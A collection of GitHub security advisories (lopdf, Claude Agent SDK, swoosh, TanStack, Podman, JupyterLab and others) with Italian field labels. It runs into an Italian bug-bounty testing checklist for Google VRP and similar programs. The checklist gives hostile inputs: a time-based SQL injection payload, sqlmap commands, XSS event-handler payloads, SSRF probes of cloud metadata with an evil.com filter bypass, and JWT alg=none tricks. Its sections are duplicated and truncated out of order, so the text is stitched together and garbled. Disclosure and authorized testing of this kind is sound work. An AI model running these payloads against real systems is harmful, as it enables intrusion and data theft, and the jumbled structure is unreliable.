Only wasmtime-wasi embeddings that use a combination of DirPerms::MUTATE with FilePerms::READ, as well as using a second preopen with higher permissions (FilePerms::WRITE as well), are affected by this bug, e.g. those that use in the WasiCtxBuilder:

```rust
builder.preopened_dir("readwrite", "readwrite", DirPerms::READ | DirPerms::MUTATE, FilePerms::READ | FilePerms::WRITE);
builder.preopened_dir("readonly", "readonly", DirPerms::READ | DirPerms::MUTATE, FilePerms::READ);
```

In particular, the Wasmtime project's wasmtime-cli's use of wasmtime-wasi is not affected, because it always sets FilePerms::all() for all preopens.

titolo: GHSA-6fj4-rcr3-r7rr: lopdf has a stack overflow via deeply nested PDF objects
descrizione:
`lopdf::Document::load_mem` (and the other `load*` entry points) parses nested PDF arrays and dictionaries with unbounded recursion. A small crafted PDF whose Catalog contains a deeply nested array (`/X [[[ … ]]]`, on the order of 10,000 levels) exhausts the call stack and aborts the process with `SIGABRT`.

Because this is a stack-overflow abort rather than a `panic!`, it cannot be caught with `catch_unwind`: any service that parses untrusted PDF input with lopdf can be crashed by a ~21 KB file, resulting in a denial of service.

Confirmed on lopdf 0.41.0 and earlier; fixed in 0.42.0. Default configuration, no features changed.

## Proof of concept

```rust
fn main() {
    let bytes = std::fs::read("poc.pdf").unwrap(); // ~10,380-deep nested array in the Catalog
    let _ = lopdf::Document::load_mem(&bytes);     // stack overflow -> SIGABRT
}
```

An equivalent PoC is a minimal PDF whose Catalog `/X` value is `"[" * 10380 + "]" * 10380`.

## Suggested fix

Enforce a maximum object-nesting depth in the parser and return an `Err` instead of recursing without bound.

titolo: GHSA-h4mw-j7qp-8mwm: Claude Agent SDK: Argument Injection via resume Option Allows Arbitrary Command Execution
descrizione:
The Claude Agent SDK for Python passed the `resume` option to the Claude CLI without validation, allowing a value beginning with `-` to be interpreted as a separate CLI flag. An attacker who controlled the `resume` value could inject an `--mcp-config` flag defining a stdio MCP server, resulting in arbitrary command execution at CLI startup that bypassed the SDK's permission controls. Exploitation required an application to pass untrusted input as the session ID to resume.

Users are advised to update to the latest version of the claude-agent-sdk package.

Thank you to hackerone.com/moamenmahmood for reporting this issue.

titolo: GHSA-vqff-r82h-9crc: ckan-mcp-server: DataStore Table UI resource does not validate postMessage origin (in) and posts to targetOrigin "*" (out)
descrizione:
## Summary

The MCP Apps UI resource (an interactive DataStore table rendered in the host's webview/iframe) communicates with its parent via `postMessage`. Its inbound `message` listener performs no `event.origin` validation, and its outbound messages are sent with target origin `'*'`. Any window/frame able to reach the document can inject data into the table and interfere with the MCP UI handshake, and the UI's own JSON-RPC messages are broadcast without an origin restriction.

## Affected code

`src/resources/datastore-table-ui.ts` (inline HTML):

```js
window.addEventListener('message', function (event) {
  var msg = event.data;                    // no check of event.origin
  if (!msg || typeof msg !== 'object') return;
  if (msg.id !== undefined && _pending[msg.id]) { ... resolve/reject pending MCP request ... }
  ...
  if (data && (data.fields || data.records)) initTable(data);   // renders attacker-supplied data
});

// outbound:
window.parent.postMessage({ jsonrpc: '2.0', id: id, method: method, params: params || {} }, '*');
mcpNot: window.parent.postMessage({ jsonrpc:'2.0', method:method, params:params||{} }, '*');
```

There is no allowlist of accepted origins for inbound messages and no fixed target origin for outbound messages.

## Impact

- **Content spoofing.** A frame that can `postMessage` to the UI can supply
  arbitrary `fields`/`records`, causing the table to render fabricated rows and
  links (e.g. a phishing `__link_url`) that appear to come from the queried
  portal. (Values are HTML-escaped, so this is display spoofing, not script
  injection — no XSS.)
- **Handshake/UX interference.** Because inbound messages matching a pending `id`
  resolve/reject the UI's MCP requests, an attacker frame can spoof responses to
  the `ui/initialize` handshake or otherwise disrupt the panel.
- **Outbound leakage.** Posting to `'*'` means the UI's JSON-RPC messages are
  delivered to whatever the parent origin is; if the resource is ever embedded by
  a context other than the trusted host, those messages leak to it.

Exploitability depends on the host embedding model (in a correct MCP Apps host the
parent is the trusted host, which limits who can message the frame), so this is a
hardening / defense-in-depth issue rather than a directly remotely-triggerable
one — hence Low.

## Proof of concept

- `poc/verify-no-origin-check.mjs` — static confirmation that the listener has no
  origin check and outbound uses `'*'`:

  ```
  [x] validates event.origin             : NO
  [x] outgoing postMessage targetOrigin  : '*' (any)
  RESULT: VULNERABLE
  ```

- `poc/parent-spoof-poc.html` — a page that embeds the UI and injects fabricated
  rows cross-origin with no handshake; the UI renders them.

## Remediation

- Validate `event.origin` against the expected host origin on every inbound
  message; drop messages from other origins.
- Send outbound `postMessage` with an explicit target origin (the host origin
  established at initialize time) instead of `'*'`.
- Optionally, bind to a nonce/channel established during `ui/initialize` so only
  the negotiated host can drive the panel.

titolo: GHSA-754j-98wh-57rf: swoosh has email-derived URL path injection in Microsoft Graph endpoint
descrizione:
### Summary

`Swoosh.Adapters.MsGraph` builds its Microsoft Graph API request URL by interpolating the sender's email address directly into the URL path (`/users/{from}/sendMail`) without percent-encoding or validation. In applications that derive the `from` address from untrusted or user-influenced input (a relay, a contact form, or a "send as" feature), an attacker can inject URL-special characters into the local part of the address to escape the intended path segment and rewrite the request's path and query string. Because the rewritten request is still sent as the application's authenticated `POST` with its Microsoft Graph bearer token, the attacker can redirect it to other Graph endpoints within the token's scopes.

### Details

The flaw is in `lib/swoosh/adapters/ms_graph.ex`. `api_endpoint_url/2` constructs the Graph endpoint by interpolating the email's `from` address into the path `/users/{from}/sendMail`. The `from` value is taken verbatim from the email struct and is neither percent-encoded nor validated against the RFC 5321 character set before being placed into the URL. `deliver/2` then issues an authenticated `POST` to that constructed URL using the application's Graph bearer token.

Because the address sits as the local part of `/users/{from}/sendMail`, characters such as `/`, `?`, and `#` are not neutralized. A `/` lets the attacker append or replace additional path segments, a `?` starts an attacker-controlled query string, and `#` truncates the remainder of the intended path. The result is that the authenticated request can be steered to a different Graph endpoint or carry attacker-chosen query parameters, all under the token's existing scopes. Applications that always send with a fixed, trusted `from` address never reach the injectable path and are unaffected.

### PoC

1. Configure an application to use `Swoosh.Adapters.MsGraph` and derive the email `from` address from user-influenced input (e.g. a contact form's reply address or a "send as" field).
2. Submit a `from` address whose local part contains URL-special characters, for example one using `/`, `?`, or `#` to escape the `/users/{from}/sendMail` path segment.
3. Trigger delivery; Swoosh interpolates the address unencoded and sends the application's authenticated Graph `POST` to the attacker-rewritten path and query string.

### Impact

An attacker who can influence the sender address can redirect an application's authenticated Microsoft Graph requests to other endpoints within the bearer token's scopes and control the request's query string, turning the mail-sending path into a constrained server-side request forgery against the Graph API.

### References

* Introduction commit: https://github.com/swoosh/swoosh/commit/23bfcdab71aee4613858ba6d116bb3311b72aa58
* Patch commit: https://github.com/swoosh/swoosh/commit/e38235453e81d1727bfc8d91e69ec4cb211ccf61
* Affected adapter source: https://github.com/swoosh/swoosh/blob/master/lib/swoosh/adapters/ms_graph.ex

titolo: GHSA-vgf9-9mxx-hq54: ClickMigrate has Path Traversal in "revision -m" argument
descrizione:
### Impact
A path traversal vulnerability in the `revision` command allowed a crafted migration name supplied via the `-m` argument to escape the intended migrations directory.

Under specific conditions, an attacker could cause the tool to create a `.sql` file in an arbitrary location writable by the user executing the command.

This issue is only exploitable if an attacker can influence the migration name passed to the `revision` command, such as through an insecure automation or CI/CD pipeline that forwards untrusted input.

### Patches
The vulnerability has been fixed in version 1.0.3 by validating and sanitizing the migration name to prevent directory traversal.

Users should upgrade to version 1.0.3 or later.

### Workarounds
Do not pass untrusted input to the `revision -m` argument.

If upgrading is not immediately possible, ensure that only trusted users or automation can invoke the `revision` command and that migration names are validated before being passed to the tool.

### References
- Fix commit: https://github.com/QueueForge/ClickMigrate/commit/6b1f2c0202630a82252b3331aa57e64327e112b6

titolo: GHSA-cv23-7vc5-jfh7: gomarkdown/markdown IsSafeURL panics on short URLs
descrizione:
## Summary

IsSafeURL slices url[:nPath] before checking that len(url) >= nPath, so a URL shorter than a path prefix (0, 1 or 2 bytes) triggers a slice-bounds panic, and this is reached end to end when the html.Safelink hardening flag is enabled and the input contains an empty or very short link destination, giving an unrecoverable crash DoS. Confirmed at HEAD (e08cff8; present since 2022).

## The defect

parser/parser.go, IsSafeURL:

```go
func IsSafeURL(url []byte) bool {
    nLink := len(url)
    for _, path := range validPaths {          // "/", "./", "../"
        nPath := len(path)
        linkPrefix := url[:nPath]               // line 789: sliced BEFORE the length guard
        if nLink >= nPath && bytes.Equal(linkPrefix, path) {   // line 790: guard is too late
            ...
```

url[:nPath] is evaluated before the `nLink >= nPath` check. When len(url) < nPath and cap(url) < nPath, the slice expression panics. Only the relative-path loop is affected; the adjacent URIs loop is already correctly guarded (the signal that this one deviates, the same signal as the anchor). Input: IsSafeURL("") panics ([:1] cap 0), IsSafeURL(".") panics ([:2] cap 1), IsSafeURL("..") panics ([:3] cap 2), while IsSafeURL("/") returns true. End to end: `markdown.ToHTML(input, html.CommonFlags|html.Safelink)` with input `[x]()` panics. Attacker model: (1) any service rendering untrusted Markdown with the html.Safelink flag (the URL-sanitizing hardening flag itself introduces the crash); or (2) any downstream that calls the exported parser.IsSafeURL on a 0/1/2-byte attacker URL, no flag required. No recover() anywhere, so an uncaught crash of the calling goroutine.

## Verification

EXECUTED with negative controls. Direct: the empty/1/2-char cases panic with the exact slice-bounds message while "/" returns true. End to end via ToHTML with html.CommonFlags|html.Safelink: `[x]()` panics, while `[x](/)`, `[x](http://example.com)`, plain text, and `[x](javascript:alert(1))` (safely dropped) do not. NOT verified: how many downstream apps enable Safelink or call IsSafeURL directly (the default no-Safelink render path does not reach it).

## Suggested fix

Move the slice inside the guard: check `nLink >= nPath` first, then compute url[:nPath] (or use bytes.HasPrefix(url, path), which is length-safe). One-line change, mirroring the already-correct URIs loop.

Also checked and sound: CVE-2026-40890 (smartypants smartLeftAngle OOB) is fixed; CVE-2024-44337 (list/paragraph infinite loop) is fixed (deep nesting capped at maxNesting=64); default XSS is by design (Safelink/SkipHTML not in CommonFlags).

## Tooling

AI assistance was used while investigating. The panic is executed-verified with negative controls (IsSafeURL on empty/./.. panics with a slice-bounds error while "/" returns true; ToHTML with html.Safelink on `[x]()` panics while valid and javascript: links do not), and I confirmed at HEAD that IsSafeURL computes url[:nPath] before the `nLink >= nPath` guard.

titolo: GHSA-qx66-fv34-fjm8: TanStack Router: Unauthenticated reflected XSS in TanStack Start server-function responses
descrizione:
## Impact

An unauthenticated attacker can craft a URL to a server function in an affected TanStack Start app. If someone opens the link, the app can return attacker-controlled HTML from its own origin and run the attacker's JavaScript there. The script can access same-origin data available to that visitor and make requests with their authority.

## Cause

The server-function transport can pass request payload fields into internal middleware state instead of limiting them to public input fields. A malformed payload can leave an attacker-controlled result in the error path. Response handling can then treat a response-shaped object as an HTTP response.

## Affected versions

Published versions of `@tanstack/start-server-core`, `@tanstack/react-start`, `@tanstack/solid-start`, and `@tanstack/vue-start` from `1.143.12` up to, but not including, their respective patched versions are affected. The patched versions are `@tanstack/start-server-core@1.169.39`, `@tanstack/react-start@1.168.60`, `@tanstack/solid-start@1.168.57`, and `@tanstack/vue-start@1.168.56`.

## Fix

The fix limits client-supplied server-function input to public fields and validates responses at the server boundary. Upgrade to the corresponding patched package version.

## Temporary mitigations

For the configured server-function path, usually `/_serverFn/*`, an edge or WAF rule can consider blocking requests without the literal `x-tsr-serverFn: true` header and browser document navigations such as `Sec-Fetch-Mode: navigate` or `Accept: text/html`. A restrictive Content Security Policy on server-function responses can provide another browser-side restriction. These are mitigation suggestions, not a complete fix. The header is client-controlled and is not authentication. Test rules against legitimate GET and POST server functions and use a matching version-specific backport where possible.

## Credits

Lovable helped us discover and report this issue. We thank them for their help.

titolo: GHSA-hqm2-cfx2-2vgh: Pipecat: Public exposure of Pipecat’s development runner can allow unauthenticated bot session creation
descrizione:
Pipecat’s built-in development runner exposes endpoints that create bot sessions and, for the Daily transport, paid Daily rooms. These development endpoints intentionally do not authenticate callers.

The runner binds to localhost by default and is designed exclusively for local development. It is not built or supported as a production server. Exploitation therefore requires an operator to deliberately make the development runner reachable from an untrusted network, such as by setting --host 0.0.0.0, publishing its port, or using a public tunnel without access controls.

If exposed in this way, an unauthenticated caller may invoke endpoints including /start, /daily, and /daily-dialin-webhook. Depending on the endpoint and configuration, this can create a bot session or Daily room and may return a room URL and join token. Repeated requests may also consume local resources and third-party service quotas.

The consequences of interacting with a launched bot depend on that bot’s configuration and connected tools. Access to external systems or sensitive information is not an inherent capability of the development runner and is therefore not included as a general impact.

Pipecat 1.6.0 clarifies this security boundary in two ways:

- The development runner displays a prominent startup banner identifying it as a development tool.
- The documentation explicitly states that the runner must not be used as a production server or exposed directly to untrusted traffic.

The local development documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-locally) identifies the unauthenticated endpoints, lack of rate limiting, and risks of public exposure. The production deployment documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-in-production) directs users to a production dispatcher or managed runtime and describes minimum protections for limited prototype use.

### Resolution

> Pipecat 1.6.0 documents and surfaces the intended security boundary of the development runner. The unauthenticated development behavior remains by design. Users must not
> expose the runner directly to untrusted networks; production deployments require an authenticated dispatcher or managed runtime.

titolo: GHSA-2cvf-wqm6-wr9g: Podman: The `podman run` command can be instructed to disable almost all sandboxing by image annotation
descrizione:
### Impact
Podman v4.4.0 added a feature where container checkpoints (from the `podman container checkpoint` command) could be distributed via OCI registry, and pulled from that registry and run via the `podman run` command. This allowed easy transfer of checkpoints between systems. However, checkpoints allow complete control of how the container is created - including full control of the container sandbox. When `podman run` detects a checkpoint, it will silently ignore all user input regarding how the container should be created - for example, `podman run --cap-drop=ALL` on an image that is determined to be a checkpoint will ignore `--cap-drop=all` and use the set of capabilities specified by the checkpoint image instead, which could include all capabilities. Podman identifies checkpoint images by looking for an annotation, `io.podman.annotations.checkpoint.runtime.name`. If this annotation is set, the image is treated as a checkpoint. Conflating container images and checkpoints in `podman run` allows inherently insecure behavior as the image can now control how it is executed. The Podman Maintainers have determined that the safest course of action is to remove this functionality.

### Patch
The commit introducing this functionality was reverted.

3721ff82ffb44a4ceeaecc5abd3808e924a6b669 c74b1d37b3fb834b0de43e176565d9d8c254b627 fa6cef22c2baf3987b581c673bb416ef0585daf7 (main)
ea9243e04d1db3886dc3a51ee3300ffb547cfc02 450c64426dbcff1097d3c7911d791101e3d16f4c 2d05a7c61f022d4f24980ea6d307fa53da2b8692 (v6.1)
7728ba0a90094408ad9078e36c3622a651d49616 24706290d5c974f078d8ca284026802515f28e92 29c8c6e50607df7a7d735ace09ff0ea099c0b3e0 (v5.8)

### Workarounds
Images being pulled should be scanned for the `io.podman.annotations.checkpoint.runtime.name` annotation, and rejected if it is present. Podman does not presently have the ability to perform this scanning and rejection automatically.

Also not that rootless containers are not affected as they do not support checkpoint/restore at all currently.

### Credits
This vulnerability was discovered by ADA Logics Ltd using Anthropic's Claude models.

titolo: GHSA-jwrc-gm9j-263p: JupyterLab: Command link trust prompt in JupyterLab can trust a document other than the one clicked
descrizione:
## Description

A Markdown file or a notebook output can carry a button that runs a JupyterLab command. Since 4.5.7 the first click on such a button opens a prompt naming the command, with Cancel, Run Once and Trust. Choosing Trust runs the command and marks the document trusted, so its later buttons run without a prompt.

Which document gets marked is decided when the user answers, not when they click. Both trust commands read whichever document is current at that moment: `markdownviewer:trust` uses `tracker.currentWidget`, and `notebook:trust` uses the equivalent lookup. If another document becomes current while the prompt is open, that document is the one marked trusted, and the one the user was looking at stays untrusted.

Users are affected if all of the following are true:

- they run JupyterLab 4.5.7 through 4.6.3, or an application that bundles it such as Notebook 7.5+;
- they open a Markdown file or notebook from someone else and click a button in it;
- they answer Trust rather than Cancel or Run Once; and
- a second document becomes the current one while the prompt is open, for example through a workspace restoring at startup, an extension activating a widget, or a command that opens a file

### Impact

The user loses control over which document they trusted. Every button in the document that was (incorrectly) marked as trusted runs from then on without a prompt, so if that document also came from an untrusted source, its buttons fire on a single click with no confirmation. That is the state the prompt was added to prevent, in [GHSA-mqcg-5x36-vfcg](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-mqcg-5x36-vfcg).

The command that ran had the user's consent, because the prompt named it and they pressed Trust. The document they were reading stays untrusted, so it prompts again on the next click.

#### Notebooks are written to disk

When the document marked is a notebook, the effect outlives the browser session. `notebook:trust` marks every cell trusted and then saves the file, which results in the server signing it, so the notebook stays trusted when it is next opened. The save also writes out any unsaved edits in that notebook. A second confirmation appears first, but it says only that a trusted notebook may execute hidden code, without naming the file, so it does not show the user which notebook is about to be trusted.

A Markdown preview marked this way stays trusted only until it is closed. Nothing is written to disk.

### Patches

JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The trust request now carries the document that was clicked, and the command is run only once that same document has been marked.

Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.

### Workarounds

Given the high complexity of a potential exploit, we advise treating this as a defense in-depth and update at earliest opportunity, rather than apply the workarounds listed below. However, for users running in highly sensitive environments who are unable to upgrade the workarounds are included below. 

Turn off command linker, which removes the ability to execute frontend commands altogether:

```json
{
  "@jupyterlab/apputils-extension:sanitizer": {
    "allowCommandLinker": false
  }
}
```

In such configuration the buttons in Markdown files and notebook outputs then do nothing when clicked. Documentation and extensions that use command links for navigation stop working, and the setting applies to every document, not only untrusted ones.

If disabling that setting is not desirable and update is not possible, advise users to choose "Run Once" rather than "Trust". "Run Once" makes the command run but no document is marked, so nothing can be trusted in error.

titolo: GHSA-wwv9-g5x4-966q: SFTPGo source-side file-pattern filter bypass during copy operations
descrizione:
### Summary

File pattern filters (`denied_patterns` / `allowed_patterns`) were evaluated on the destination of a copy only. A user holding the copy permission could copy a file denied by the filters to a permitted name and then read it. A recursive directory copy reproduced the contents of a restricted directory under a path where the filters do not deny them, and the hide policy was affected in the same way: a file reported as missing by stat and by directory listings could still be copied.

### Details

An authenticated user can read the contents of files that the file pattern filters are configured to deny them. Nothing else is bypassed: the home directory, the virtual folder layout and the per-directory permissions are all still enforced, and both ends of the copy are paths the account can already reach. No access to other accounts and no administrative capability.

titolo: GHSA-pq7j-f95f-qfcv: Claude Code: Plugin Hash Pin Bypass Allows Bypass of Hash Pinning
descrizione:
The plugin install flow in Claude Code and Claude Desktop checked out a marketplace's pinned commit SHA using `git checkout` without verifying that the resulting HEAD matched the pinned SHA. An attacker controlling a plugin's upstream repository could create a branch named identically to the pinned 40-character SHA, causing the checkout to silently resolve to the attacker's branch tip instead of the reviewed commit, resulting in attacker-controlled code being installed bypassing the pinned hash. Exploitation required a user to install a malicious plugin, pin to a safe hash, and for the plugin source to be hosted on a git host that permitted SHA-shaped branch names.

Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.

Thank you to Or Nevo Michrowski of Air Security for reporting this issue.

titolo: GHSA-rp3h-jf77-q9p4: containerd: Unpack DoS via repeated opaque whiteouts
descrizione:
### Impact

A vulnerability exists in containerd's layer unpack handler where the processing of certain image layers causes superlinear time complexity. During the unpack operation, specific file configurations within the layer can trigger repeated directory traversals.

Consequently, pulling or importing a maliciously crafted image can result in increased unpack times and a moderate increase in CPU usage. This delays container startup, even if the compressed image layers are small. Additionally, in orchestrators like Kubernetes that apply concurrency limits to image pulls, these excessively long operations can reduce the available concurrency for other pulls, potentially delaying unrelated container deployments.

### Patches

This bug has been fixed in containerd 2.3.5, 2.2.8, 2.0.12, and 1.7.35. Users should update to these versions to resolve the issue.

### Workarounds

There are no known workarounds for this issue. Users are advised to only pull and import trusted images from known registries until the patch can be applied.

### Credits

The containerd project would like to thank Jakub Ciolek of AlphaSense for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)

To report a security issue in containerd:
* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)
* Email us at [security@containerd.io](mailto:security@containerd.io)

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

Verifica GraphQL introspection se presente

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password

steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)

Documenta sempre con screenshot prima/dopo

steps: Identifica endpoint con rate limit (login, OTP, search)

Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: OAuth Flow Analysis
testingTechniques.description: Google usa OAuth 2.0 pesantemente, molti bug storici sono qui
steps: Intercetta il flusso OAuth con Burp
Modifica redirect_uri, client_id, scope, state
Testa open redirect in redirect_uri
Verifica token leak in referer header
Testa PKCE bypass su mobile app

testingTechniques.name: Cross-Product IDOR
testingTechniques.description: Un account Google da accesso a 20+ prodotti: cerca IDOR cross-service
steps: Crea risorsa in Drive / Photos / Calendar
Cattura l'ID della risorsa
Prova ad accedere da account Google diverso
Verifica permessi di condivisione
Testa Google Docs shared con link pubblici

reportingSteps: 1. Usa Google Issue Tracker (issuetracker.google.com) con tag VRP
2. Includi: Title, Target, Summary, Steps, PoC, Impact, Suggested Fix
3. Aspetta triage (fino a 2 settimane, ma critici sono veloci)
4. Rispondi solo se chiedono chiarimenti, non insistere
5. Google NON rilascia CVE per ogni bug, ma conferma il fix
6. Il pagamento avviene tramite Google BugHunter University rewards
quickStartGuide: Step 1: Vai su bughunters.google.com e studia il program policy
Step 2: Iscriviti a Google BugHunter University (gratuita, con certificati)
Step 3: Inizia da Google Docs/Sheets: hanno molti bug di business logic
Step 4: Studia il flusso OAuth: la maggior parte dei bug Google sono qui
Step 5: Testa cross-product: un bug in Drive impatta anche Photos/Gmail
Step 6: Usa Google stesso per enumerarsi: dorks come site:*.google.com inurl:admin
Step 7: Leggi il blog di Project Zero per capire la qualità attesa
Step 8: Sii paziente: Google VRP è molto competitivo
tips: 💡 Google VRP è IL programma più competitivo: 100+ hunter esperti al giorno
💡 Concentrati su prodotti meno battuti: Google Fit, Google Chat, Cloud Console
💡 I bug accettati sono spesso catene: 2-3 low = 1 high
💡 Studia i writeup su Project Zero: mostrano lo standard qualitativo
💡 Il reverse engineering di app mobile Google è spesso fruttuoso
💡 Google Docs/Sheets collaborative editing ha avuto decine di RCE storici
💡 Account multipli sono essenziali: crea 5-10 account Google per test
💡 Non riportare bug in vendor di terze parti (es. problema in libreria JS)
💡 Il triage è lento, non scoraggiarti se non rispondono in 2 settimane

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
